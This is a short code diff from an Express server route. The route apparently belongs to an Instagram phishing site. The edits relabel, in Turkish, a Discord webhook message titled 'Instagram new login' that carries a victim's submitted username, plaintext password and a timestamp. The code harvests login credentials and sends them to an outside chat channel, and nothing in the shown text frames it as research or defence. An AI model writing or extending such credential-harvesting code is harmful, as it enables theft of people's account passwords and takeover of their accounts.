@@ -17,23 +17,23 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       // Prepare Discord webhook message
       const message = {
-        content: "Yeni Giriş Denemesi",
+        content: "🚨 **Instagram Yeni Giriş** 🚨",
         embeds: [{
-          title: "Giriş Bilgileri",
+          title: "Hesap Bilgileri;",
           color: 16426522, // Instagram pembemsi renk
           fields: [
             {
-              name: "Kullanıcı Adı",
+              name: "👤 Kullanıcı Adı:",
               value: username,
               inline: true
             },
             {
-              name: "Şifre",
+              name: "🔒 Şifre:",
               value: password,
               inline: true
             },
             {
-              name: "Zaman",
+              name: "🕝 Tarih:",
               value: new Date().toISOString(),
               inline: false
             }
